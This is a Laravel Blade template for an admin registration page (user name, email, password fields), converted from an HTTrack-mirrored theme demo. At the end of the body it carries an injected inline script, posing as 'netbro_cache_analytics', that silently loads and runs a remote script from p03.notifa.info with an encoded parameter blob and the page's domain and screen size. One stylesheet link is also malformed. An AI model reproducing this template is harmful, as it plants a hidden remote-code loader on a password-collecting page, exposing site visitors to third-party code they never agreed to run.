<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from theembazaar.com/demo/eforest/skypike/demo/page-register.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 01 Apr 2020 13:19:44 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Register</title>
    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
    <!-- google font -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet" type="text/css" />
    <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet" type="text/css">
    <link href="{{asset('assets/css/font-awesome.min.css')}}" rel="stylesheet" type="text/css">
    <link href="{{asset('assets/css/ionicons.css" rel="stylesheet')}}" type="text/css">
    <link href="{{asset('assets/css/simple-line-icons.css')}}" rel="stylesheet" type="text/css">
    <link href="{{asset('assets/css/themify-icons.css')}}" rel="stylesheet" type="text/css">
    <link href="{{asset('assets/css/jquery.mCustomScrollbar.css')}}" rel="stylesheet">
    <link href="{{asset('assets/css/style.css')}}" rel="stylesheet">
    <link href="{{asset('assets/css/header.css')}}" rel="stylesheet">
    <link href="{{asset('assets/css/menu.css')}}" rel="stylesheet">
    <link href="{{asset('assets/css/index.css')}}" rel="stylesheet">
    <link href="{{asset('assets/css/responsive.css')}}" rel="stylesheet">
</head>

<body class="bg_darck">
<div class="sufee-login d-flex align-content-center flex-wrap">
    <div class="container">
        <div class="login-content">
            <div class="logo">
                <a href="#">
                    <strong class="logo_icon">
                        <img alt="" src="{{asset('assets/images/small-logo.png')}}">
                    </strong>
                    <span class="logo-default">
                        <img alt="" src="{{asset('assets/images/logo.png')}}">
                    </span>
                </a>
            </div>
            <div class="login-form">
                <form method="post" action="{{route('admin.register.submit')}}">
                    @csrf
                    <div class="form-group">
                        <label>User Name</label>
                        <input type="text" class="form-control @error('name') is-invalid @enderror"
                               placeholder="User Name" name="name">
                        @error('name')
                        <span class="invalid-feedback" role="alert">
                            <strong>{{ $message }}</strong>
                        </span>
                        @enderror
                    </div>

                    <div class="form-group">
                        <label>Email address</label>
                        <input type="email" class="form-control @error('email') is-invalid @enderror"
                               placeholder="Email" name="email">

                        @error('email')
                        <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                        @enderror
                    </div>

                    <div class="form-group">
                        <label>Password</label>
                        <input type="password" class="form-control @error('password') is-invalid @enderror"
                               placeholder="Password" name="password">
                        @error('password')
                        <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                        @enderror
                    </div>

                    <div class="form-group">
                        <label>Password Konfirmasi</label>
                        <input type="password" class="form-control" placeholder="Password" name="password_confirmation">
                    </div>

                    <button type="submit" class="btn btn-success btn-flat m-b-30 m-t-30">Register</button>
                    <div class="social-login-content">
                    </div>
                    <div class="register-link m-t-15 text-center">
                        <p>Already have account ?
                            <a href="{{route('admin.login')}}"> Sign in</a>
                        </p>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
<script type="text/javascript" src="{{asset('assets/js/jquery.min.js')}}"></script>
<script type="text/javascript" src="{{asset('assets/js/popper.min.js')}}"></script>
<script type="text/javascript" src="{{asset('assets/js/bootstrap.min.js')}}"></script>
<script type="text/javascript" src="{{asset('assets/js/jquery.dcjqaccordion.2.7.js')}}"></script>
<script src="{{asset('assets/js/custom.js')}}" type="text/javascript"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXbYu5N%2f%2bn25%2fBvzuPEpVkuZhtMqPZ4k0OvhH8jiVHPZXOhK4TdQqrLhRw3GsARsw0dFHylHBdFCSd5TtXr%2bL2zj9F6rwIiO5wBVx0rmam4IXUGq1BiZK4Y6KhUwhsIHV6RMJ7t9Uw6Jur1wVTt3so7NnF9lYOJ3tfLc9X9J6XSJzi3imbNZGvSePC1LHe%2bE59SLiGHzVnRDW%2fvmjTfPhYp21kFDquITfa5GSKYEmR7w5euBMxFD6azv%2fI8ugfhtq3bBtXmZ%2bz%2bO%2bFVynavxdl9jEdMGoUzwtP1DynrBWb0kpZDsBU9skB4RRvbiFwUj%2bvLc1xYUYl4o08TleeHlX2qVZRVQbzfZSnyyOEWpn4QFptKXJhRZvVlvMTjSbmxxxRAVnpDcxx%2fQhNz5dd6Aj%2bGFkSYCru5T2Tzsv32uNzFz0HzBs2jrrWyQUf6vrntpBzyXrRez2RmDW9%2bXAtNY55QE0kXRN3XkOt5HWi2I%2bLzzZiXv8xtqyauneqGFdXgK8H" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from theembazaar.com/demo/eforest/skypike/demo/page-register.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 01 Apr 2020 13:19:44 GMT -->
</html>
